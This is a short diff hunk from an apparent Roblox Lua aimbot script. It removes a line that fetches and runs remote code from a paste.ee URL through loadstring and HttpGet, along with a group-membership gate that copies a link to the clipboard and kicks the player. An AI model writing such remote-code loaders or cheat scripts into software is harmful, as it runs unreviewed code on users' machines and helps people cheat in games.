@@ -85,11 +85,3 @@ RunService:BindToRenderStep("AimLock", 0, function()
             end
         end
     end)
-    wait(1)
-    loadstring(game:HttpGet("https://paste.ee/r/DstYB"))()
-        
-    else
-setclipboard("https://www.roblox.com/groups/32768211/Night-Owls#!/about")
-wait(1)
-game.Players.LocalPlayer:Kick("Join the group to use the script, the link was copied to your clipboard!")
-        end
